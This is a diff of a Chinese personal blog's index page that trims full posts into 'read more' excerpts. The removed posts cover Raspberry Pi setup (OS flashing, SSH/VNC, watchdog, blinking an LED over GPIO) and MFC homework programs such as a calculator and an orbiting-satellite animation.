@@ -321,24 +321,12 @@
 
       
         
-          
-            <h2 id="python-GPIO集成库"><a href="#python-GPIO集成库" class="headerlink" title="python GPIO集成库"></a>python GPIO集成库</h2><p>我大概了解了下树莓派的几种库，比较常见的有python GPIO，BCM2835    C    Library还有wiringPi，其实对于我们自动化的学生来说最熟悉的应该就是wiringPi。Pi的官方资料中推荐的是python GPIO，而且相较于C，python更加简洁易读。</p>
-<h2 id="让LED闪烁"><a href="#让LED闪烁" class="headerlink" title="让LED闪烁"></a>让LED闪烁</h2><p>在这个实验中，我只是简单的控制了一个GPIO口，输出一个方波信号，占空比50%，这样就可以让一个LED小灯闪烁。  </p>
-<ul>
-<li>连接实验电路<br>在单片机学习中，掌握好各个引脚的功能是非常重要的，要根据电路的连接来写相关的控制程序。在Pi中我们可以使用<code>GPIO readall</code>来列出所有的引脚，便于我们下一步操作。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzgw1ez451il6owj30fu0cjjue.jpg" alt="引脚图"><br>然后将LED，电阻串联起来，LED正端接GPIO口，负接地。记得用杜邦线，拿着导线乱碰很可能导致引脚短路，损坏Pi。   </li>
-<li>Python代码部分<br>新建LED.py文件，加入以下代码:   <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blink</span><span class="params">(pin)</span>:</span></div><div class="line">        GPIO.output(pin,GPIO.HIGH)</div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line">		GPIO.output(pin,GPIO.LOW)</div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line">        <span class="keyword">return</span></div><div class="line">GPIO.setmode(GPIO.BOARD)</div><div class="line">GPIO.setup(<span class="number">7</span>,GPIO.OUT）</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">        blink(<span class="number">7</span>)</div><div class="line">GPIO.cleanup()</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>然后执行下试试吧～<br><img src="http://ww4.sinaimg.cn/large/005WMcFzgw1ez452ev870j31kw16oncv.jpg" alt="点亮的LED"><br>图是随手拍的，桌上的电阻都有点大了，亮起来不明显。建议大家还是串上一个阻值合适的电阻，GPIO输出的电压幅值好像是1V。当然大家就不要作死把发光二极管直接接在3.3V和GND之间了，不要问我是怎么知道的+_+，我炸了一个。<br>可以通过:   </p>
-<pre><code class="c">pi@raspberrypi:~/Desktop $ sudo cat /sys/kernel/debug/gpio
-GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<span class="number">3f</span>200000.gpio, pinctrl-bcm2835:
- gpio<span class="number">-35</span>  (?                   ) in  hi
- gpio<span class="number">-47</span>  (?                   ) out lo
-</code></pre>
-<p>来查看引脚状态。</p>
-<p>最后说两句题外话吧:<br>其实系里还是挺关心我们的，想要什么小零件基本都能提供。模电老师还给我们每个人准备了一个小器件包，里面有面包版，各种电容电阻什么的。虽然都不是什么精贵的东西，但看到宿舍里有各种各样的小元件和各种工具，总有一种迷之幸福感。万用表好像也可以向系里申请了，还是希望系里越来越好吧（≧∇≦）</p>
-
-          
+          <h2 id="python-GPIO集成库"><a href="#python-GPIO集成库" class="headerlink" title="python GPIO集成库"></a>python GPIO集成库</h2><p>我大概了解了下树莓派的几种库，比较常见的有python GPIO，BCM2835    C    Library还有wiringPi，其实对于我们自动化的学生来说最熟悉的应该就是wiringPi。Pi的官方资料中推荐的是python GPIO，而且相较于C，python更加简洁易读。<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/12/17/2015-12-17-pi/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -448,18 +436,13 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
 
       
         
-          
-            <ul>
-<li>Raspberry装好了，显示器也搞定了，玩了整整一天(☆_☆)，发现了一个小问题：我的桌面不够大呀！！！显示器，树莓，笔记本电脑，外卖，概率作业不够放了怎么破，立马想到看过可以通过SSH和VNC的方式访问Pi，来试试吧！  </li>
-</ul>
-<h2 id="两种方式"><a href="#两种方式" class="headerlink" title="两种方式"></a>两种方式</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>命令行访问Pi，轻巧且功能强大。简单配置一下Pi,打开SSH服务即可:<br><code>service ssh start</code><br>在Mac终端输入:<br><code>sudo ssh pi@192.168.1.6</code>  </p>
-<p><code>192.168.1.6</code>是Pi的ip。输入Pi的密码就可以连上了。更多的配置不细讲了，<a href="http://www.jianshu.com/p/a011d01bdf51" target="_blank" rel="external">简书</a>的这篇文章提到了关于配置root用户ssh登录的权限问题，<a href="http://liberize.me/tech/access-raspberry-pi-via-ssh-and-vnc.html" target="_blank" rel="external">liberize.blog</a>提到了使用私钥登录的问题。  </p>
-<h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><p>如果要使用Pi的图形界面，大家可以使用VNC服务。Pi需要安装vnc服务端，并在Mac上安装tigervnc(icon挺帅的)。   </p>
-<h4 id="Pi的配置"><a href="#Pi的配置" class="headerlink" title="Pi的配置"></a>Pi的配置</h4><p>我查到的资料大多数是在Pi上安装tightvncserver<code>sudo apt-get install tightvncserver</code>，简单的配置下用<code>service start tightvncserver</code>发现终端报错了。找不到目录的原因不清楚……<br>我发现在Jessie中貌似已经安装VNC服务，抱着试试的心态输入<code>vncserver</code><br>终端出现了帮助页面，可以这样打开VNC服务:<br><code>vncserver:1</code></p>
-<h4 id="Mac的配置"><a href="#Mac的配置" class="headerlink" title="Mac的配置"></a>Mac的配置</h4><p>安装tigervnc<a href="https://github.com/TigerVNC/tigervnc/releases" target="_blank" rel="external">下载</a>，编译安装。<br>发现Homebrew可以直接装，果断弃了tar.gz<br><code>brew cask install tigervnc-viewer</code><br>打开tigervnc，输入<code>192.168.1.6</code>，点Connect就连上啦。  </p>
-<h2 id="惯例"><a href="#惯例" class="headerlink" title="惯例"></a>惯例</h2><p>放上一些图片吧<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1eyyf1w019uj32io1w0hdt.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1eyyf1woamxj31400p0dk1.jpg" alt=""><br>发现屏下面垫一个橡皮还蛮不错的…… 下一阶段是学习GPIO的使用，主要还是使用WiringPi或者BCM2835    C    Library来写，Python正在学ˊ_&gt;ˋ     </p>
-
-          
+          <ul>
+<li><p>Raspberry装好了，显示器也搞定了，玩了整整一天(☆_☆)，发现了一个小问题：我的桌面不够大呀！！！显示器，树莓，笔记本电脑，外卖，概率作业不够放了怎么破，立马想到看过可以通过SSH和VNC的方式访问Pi，来试试吧！  </p>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/12/13/2015-12-13-pi/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -569,34 +552,13 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
 
       
         
-          
-            <ul>
-<li>生日快到了，女票送了一个树莓ψ(｀∇´)ψ,好开心，简单写下使用体验吧。</li>
-</ul>
-<h2 id="Raspberry-Pi简介"><a href="#Raspberry-Pi简介" class="headerlink" title="Raspberry Pi简介"></a>Raspberry Pi简介</h2><p>树莓派（英语：Raspberry Pi），是一款基于Linux系統的只有信用卡大小的单片机电脑。它由英国的树莓派基金会所开发，目的是以低价硬件及自由软件刺激在学校的基本电脑科学教育。配备有Broadcom出产的ARM架构700MHz BCM2836处理器，1G内存，还有一些必须的接口。<br>除了电脑上都有的接口，树莓派还有GPIO的拓展接口，这为工科狗实现一些很有意思的想法提供了巨大的空间，比如四轴飞行器，智能小车什么的。先留个坑，以后再填吧。</p>
-<h2 id="系统的安装"><a href="#系统的安装" class="headerlink" title="系统的安装"></a>系统的安装</h2><ol>
-<li>在Pi的官网上下载系统镜像<a href="https://www.raspberrypi.org/downloads" target="_blank" rel="external">(下载页面)</a>,我选择的是Raspbian(名字Raspberry+Debian233),解压后得到一个.img镜像。 </li>
-<li>插入TF卡，用df命令查看当前挂载的卷：<br><code>df -h</code><br>确认设备<br><code>diskutil list</code><br>确定一下你的TF卡是哪个。</li>
-<li>卸载TF卡上的分区<br><code>diskutil unmount /dev/disk2   // /dev/disk2是我的TF卡</code></li>
-<li>将系统刷入卡中<br>把当前目录切换到要装载的系统镜像的所在目录<br><code>sudo dd bs=4m if=2015-11-21-raspbian-jessie.img of=/dev/rdisk2</code><br>输入密码后不会出现任何提示，要等上几分钟，别着急用ctrl+c结束。</li>
-<li>卸载设备<br><code>diskutil unmountDisk /dev/disk2</code>    </li>
-</ol>
-<h2 id="Pi的开机配置"><a href="#Pi的开机配置" class="headerlink" title="Pi的开机配置"></a>Pi的开机配置</h2><h3 id="语言和键盘"><a href="#语言和键盘" class="headerlink" title="语言和键盘"></a>语言和键盘</h3><p>把HDMI，鼠标键盘电源线接好，然后它居然直接出现了桌面，难道是我的人品太好（ ｉ <em> ｉ ）。<br>激动的点开终端，咦，怎么有些键不能用=</em>=<br>别慌，Pi是腐国的产品，默认的是英式键盘的键位，我们使用的大部分都是美式键盘。所以我们简单的配置下:<br>终端输入<br><code>raspi-config</code><br>选<code>Internationalisation opntions</code><br>选<code>I3 Change Keyboard Layout</code><br>选<code>Generic 101-key  PC</code><br>选<code>Other</code><br>选<code>English(US)</code><br>选<code>English(US) - English(US,alternative international)</code><br>后面都选择确定，键盘上下键选择，tab切换选项，enter确定。<br>注意！！！我不建议大家把Pi的系统语言改成中文的，至于为什么大家试一试就知道了，字体炸裂……<br>注:编码需要选择下，UTF-8，原因大家都懂。给个<a href="http://www.guokr.com/post/520901/" target="_blank" rel="external">果壳</a>的参考，我就不多写了。  </p>
-<h3 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h3><p><code>sudo apt-get -y install ttf-wqy-zenhei</code></p>
-<h3 id="安装VIM"><a href="#安装VIM" class="headerlink" title="安装VIM"></a>安装VIM</h3><p>好吧，这步大家可以跳过，我有强迫症:-)<br><code>sudo apt-get install -y vim</code><br>简单配置下代码高亮<br>在～目录下新建.vimrc文件，写入下面的内容:  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">set nu</div><div class="line">syntax on</div><div class="line">set tabstop=4</div></pre></td></tr></table></figure>
-<h2 id="配置watchdog"><a href="#配置watchdog" class="headerlink" title="配置watchdog"></a>配置watchdog</h2><p>Pi的看门狗防止程序死循环，设置好就能让Pi在当机的时候自动重启。 </p>
-<ol>
-<li>启动硬件看门狗模块<br><code>sudo modprobe bcm2708_wdog</code></li>
-<li>编辑/etc/modules,启动时自加载模块<br><code>sudo vim /etc/modules</code><br>在文件的最后加上<br><code>bcm2708_wdog</code></li>
-<li>启动与配置watchdog<br>启动watchdog<br><code>sudo /etc/init.d/watchdog start</code><br>编辑配置文件<br><code>sudo vim /etc/watchdog.conf</code><br>把<code>#watchdog-device =/dev/watchdog</code>前面的<code>#</code>删去<br>重新启动watchdog<br><code>sudo /etc/init.d/watchdog restart</code><br>还可以监控芯片温度什么，过热自动重启之类。<h2 id="一些小插曲和随手拍的图"><a href="#一些小插曲和随手拍的图" class="headerlink" title="一些小插曲和随手拍的图"></a>一些小插曲和随手拍的图</h2></li>
-</ol>
-<ul>
-<li>中间有个小小的意外，我随手装了个多媒体系统试试效果，XBMC，就是这货，装完重启直接进不了系统了233。简单分析了下原因，貌似是显存分配不足，应该要在安装前配置下内存的分配。这个小插曲直接导致了我决定今晚赶紧把今天做的配置记录下来。这样一块用来折腾的Pi估计以后要经常重刷系统了=_=  </li>
-<li>桌面上的显示器是一块笔记本的屏，我又在万能的某宝上买了块驱动版，我现在打算买个相框把屏幕裱起来。话说不加壳的屏真的是好薄啊，看起来很有逼格。<br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1eyx9x5jdvej32io1w0e81.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1eyx9wypk1rj32io1w0npd.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1eyx9whbb85j32io1w01kx.jpg" alt=""><h2 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h2>感谢我爱的和爱我的票票！！！</li>
-</ul>
-
-          
+          <ul>
+<li>生日快到了，女票送了一个树莓ψ(｀∇´)ψ,好开心，简单写下使用体验吧。
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/12/12/2015-12-12-pi/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -706,16 +668,14 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
 
       
         
-          
-            <h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
+          <h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
 <li>编写一个计算器程序。使用该计算机使用编辑控件直接输入数据，并有加减乘除、平方根和倒数运算功能。</li>
-<li>简要分析:用AppWizard生成一个基于对话框的应用程序框架，编辑对话框模版资源，添加一个编辑控件，添加8个按钮，设置下ID和Caption。</li>
-</ul>
-<h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnSetfocusInput() </div><div class="line">&#123;</div><div class="line">	m_fInput=<span class="number">0.0</span>;</div><div class="line">	UpdateData(FALSE);</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnAdd() </div><div class="line">&#123;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">1</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnCalc() </div><div class="line">&#123;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	UpdateData(TRUE);</div><div class="line">	<span class="keyword">switch</span>(m_nOP)</div><div class="line">	&#123;</div><div class="line">	    <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">		    m_fResult=m_fInput;</div><div class="line">		    <span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">			m_fResult+=m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">			m_fResult-=m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">			m_fResult*=m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">			m_fResult/=m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">			m_fResult=<span class="number">1</span>/m_fInput;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">			m_fResult=<span class="built_in">sqrt</span>(m_fInput);</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">	m_fInput=m_fResult;</div><div class="line">	UpdateData(FALSE);</div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnClear() </div><div class="line">&#123;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	m_fResult=<span class="number">0.0</span>;</div><div class="line">	m_fInput=<span class="number">0.0</span>;</div><div class="line">	m_nOP=<span class="number">0</span>;</div><div class="line">	UpdateData(FALSE);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnDiv() </div><div class="line">&#123;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">4</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnMul() </div><div class="line">&#123;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">3</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnReciprocal() </div><div class="line">&#123;</div><div class="line">	m_nOP=<span class="number">5</span>;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">0</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnSqrt() </div><div class="line">&#123;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	m_nOP=<span class="number">6</span>;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> CCalculatorDlg::OnSub() </div><div class="line">&#123;</div><div class="line">	OnCalc();</div><div class="line">	m_nOP=<span class="number">2</span>;</div><div class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></div><div class="line">	</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>省略了一些声明和初始化代码。</p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>新知识主要有:<br>为编辑控件的消息EN_SETFOCUS添加一个映射函数OnSetfocusInput()。<br>对话框类的成员函数UpdateData()用于更新数据。</p>
-
-          
+<li>简要分析:用AppWizard生成一个基于对话框的应用程序框架，编辑对话框模版资源，添加一个编辑控件，添加8个按钮，设置下ID和Caption。
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/12/09/2015-12-08-mfc/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -825,45 +785,14 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
 
       
         
-          
-            <h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
+          <h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
 <li>设计基于单文档/视图结构的程序。绘制2条圆形轨道，然后设计2个卫星（圆形代替），使其分别沿内外轨迹匀速行走。轨道路宽度、半径、颜色由轨道设定菜单加对话框指定；有开始、结束菜单；有高速、中速、低速三个菜单控制卫星速度；卫星颜色、标号由按下鼠标左键加对话框指定。</li>
-<li>简单分析：两个圆形轨道和卫星应该是用Ellipse()函数实现，匀速行走则是通过定时器来实现，至于菜单对话框什么的都不是很复杂。说白了这个题目并没有什么难度，只是说考察的点很多，比较繁琐。</li>
-</ul>
-<h3 id="设计菜单"><a href="#设计菜单" class="headerlink" title="设计菜单"></a>设计菜单</h3><p>菜单包括:Status(Start/Stop)、Speed(High/Medium/Low)、Preferences(Width/Radii/Color)。<br>还有添加一个鼠标左键消息处理函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void CSatelliteView::OnStart() &#123;	// TODO: Add your command handler code here	CSatelliteDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	SetTimer(1,100,NULL);	&#125;void CSatelliteView::OnStop() &#123;	// TODO: Add your command handler code here	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	KillTimer(1);	&#125;void CSatelliteView::OnHigh() &#123;	// TODO: Add your command handler code here	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;m_speed = 1.0;	&#125;void CSatelliteView::OnMedium() &#123;	// TODO: Add your command handler code here	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;m_speed = 0.5;	&#125;void CSatelliteView::OnLow() &#123;	// TODO: Add your command handler code here	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;m_speed = 0.1;&#125;void CSatelliteView::OnWidth() &#123;	// TODO: Add your command handler code here	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	Width dlgInput;	int nRet = dlgInput.DoModal();	if(nRet == IDOK)	&#123;		pDoc-&gt;m_widthDoc=dlgInput.m_width;		pDoc-&gt;m_widthDocx=dlgInput.m_widthx;		Invalidate();	&#125;	&#125;void CSatelliteView::OnRadii() &#123;	// TODO: Add your command handler code here	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	Radii dlgInput;	int nRet = dlgInput.DoModal();	if(nRet == IDOK)	&#123;		pDoc-&gt;m_radiiDoc=dlgInput.m_radii;		pDoc-&gt;m_radiiDocx=dlgInput.m_radiix;		Invalidate();	&#125;		&#125;void CSatelliteView::OnColor() &#123;	// TODO: Add your command handler code here	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	CColorDialog dlg;	if(dlg.DoModal() == IDOK)	&#123;		pDoc-&gt;m_orbitColor=dlg.GetColor();		Invalidate();	&#125;	&#125;void CSatelliteView::OnLButtonDown(UINT nFlags, CPoint point) &#123;	// TODO: Add your message handler code here and/or call default	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	CColorDialog dlg;	if(dlg.DoModal() == IDOK)	&#123;		pDoc-&gt;m_satelliteColor=dlg.GetColor();		Invalidate();	&#125;	CView::OnLButtonDown(nFlags, point);&#125;void CSatelliteView::OnTimer(UINT nIDEvent) &#123;	// TODO: Add your message handler code here and/or call default	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;m_angle += pDoc-&gt;m_speed;	Invalidate();	CView::OnTimer(nIDEvent);&#125;</div></pre></td></tr></table></figure></p>
-<p>代码并不是特别的复杂，只是比较繁琐，至于创建类，声明变量之类的就不一一赘述了。  </p>
-<h3 id="绘图"><a href="#绘图" class="headerlink" title="绘图"></a>绘图</h3><p>我做了一个响应式的布局，思路大概是先获得用户区的大小，然后算出中点。以该中点为圆心画出两个半径为用户指定的同心圆。注意画笔的选择，画刷选择为空，否则大圆会覆盖小圆。<br>通过公式计算出两个圆上的点来确定卫星的圆心，然后以卫星的圆心画半径为定值的圆，通过定时器不断重绘从而让它运动起来。<br>详细的代码如下:</p>
-<pre><code class="c++"><span class="keyword">void</span> CSatelliteView::OnDraw(CDC* pDC)
-{
-    CSatelliteDoc* pDoc = GetDocument();
-    ASSERT_VALID(pDoc);
-    CRect rectClient;
-    GetClientRect(&amp;rectClient);
-    <span class="keyword">double</span> x,y;
-    x=(rectClient.right-rectClient.left)/<span class="number">2</span>;
-    y=(rectClient.bottom-rectClient.top)/<span class="number">2</span>;
-    pDC-&gt;SelectStockObject(NULL_BRUSH);
-    CPen newPen;
-    CPen newPenx;
-    CPen newPen_satellite;
-    newPen.CreatePen(PS_SOLID,pDoc-&gt;m_widthDoc,pDoc-&gt;m_orbitColor);
-    newPen_satellite.CreatePen(PS_SOLID,<span class="number">2</span>,pDoc-&gt;m_satelliteColor);
-    newPenx.CreatePen(PS_SOLID,pDoc-&gt;m_widthDocx,pDoc-&gt;m_orbitColor);
-    CPen *poldPen;
-    poldPen=pDC-&gt;SelectObject(&amp;newPen);
-    pDC-&gt;Ellipse(x-pDoc-&gt;m_radiiDoc,y-pDoc-&gt;m_radiiDoc,x+pDoc-&gt;m_radiiDoc,y+pDoc-&gt;m_radiiDoc);
-    poldPen=pDC-&gt;SelectObject(&amp;newPenx);
-    pDC-&gt;Ellipse(x-pDoc-&gt;m_radiiDocx,y-pDoc-&gt;m_radiiDocx,x+pDoc-&gt;m_radiiDocx,y+pDoc-&gt;m_radiiDocx);
-    poldPen=pDC-&gt;SelectObject(&amp;newPen_satellite);
-    pDC-&gt;Ellipse(x+pDoc-&gt;m_radiiDoc*<span class="built_in">cos</span>(pDoc-&gt;m_angle)<span class="number">-15</span>,y+pDoc-&gt;m_radiiDoc*<span class="built_in">sin</span>(pDoc-&gt;m_angle)<span class="number">-15</span>,x+pDoc-&gt;m_radiiDoc*<span class="built_in">cos</span>(pDoc-&gt;m_angle)+<span class="number">15</span>,y+pDoc-&gt;m_radiiDoc*<span class="built_in">sin</span>(pDoc-&gt;m_angle)+<span class="number">15</span>);
-    pDC-&gt;Ellipse(x+pDoc-&gt;m_radiiDocx*<span class="built_in">cos</span>(pDoc-&gt;m_angle)<span class="number">-15</span>,y+pDoc-&gt;m_radiiDocx*<span class="built_in">sin</span>(pDoc-&gt;m_angle)<span class="number">-15</span>,x+pDoc-&gt;m_radiiDocx*<span class="built_in">cos</span>(pDoc-&gt;m_angle)+<span class="number">15</span>,y+pDoc-&gt;m_radiiDocx*<span class="built_in">sin</span>(pDoc-&gt;m_angle)+<span class="number">15</span>);
-    <span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>
-}
-</code></pre>
-<p>我觉得我写的简直乱到一定程度了-_-#   </p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这个程序几乎是一气呵成的，编译一遍通过简直感人。但是这个程序还是有很多细节有待完善，比如说设置初始值的问题。个人认为用户在打开这个程序的时候应该是两个卫星在跑而不是一片空白，用户根据自己的个性化需求更改一些参数，这样看起来会更友好一些。单论MFC的文档/视图结构的话貌似并没什么太复杂的内容，整个就是一个大模版，只要你循规蹈矩，解出这些水题也就是时间问题吧=_=</p>
-
-          
+<li>简单分析：两个圆形轨道和卫星应该是用Ellipse()函数实现，匀速行走则是通过定时器来实现，至于菜单对话框什么的都不是很复杂。说白了这个题目并没有什么难度，只是说考察的点很多，比较繁琐。
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/11/19/2015-11-19-mfc/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -973,25 +902,14 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
 
       
         
-          
-            <h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
+          <h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
 <li>用规定的颜色绘制正弦、余弦曲线。由菜单或对话框定颜色。</li>
-<li>这个看起来如此简单的东西耗费了我半天的时间ಥ_ಥ，大部分时间用在了调一个令人无语的bug上。</li>
-</ul>
-<p>首先我做了下菜单，包括一个颜色选择菜单(弹出颜色选择对话框)，一个模式选择的下拉菜单(画正弦还是画余弦)。   </p>
-<p>做完菜单以后给它们添加消息处理函数。  </p>
-<ol>
-<li><p>颜色选择:</p>
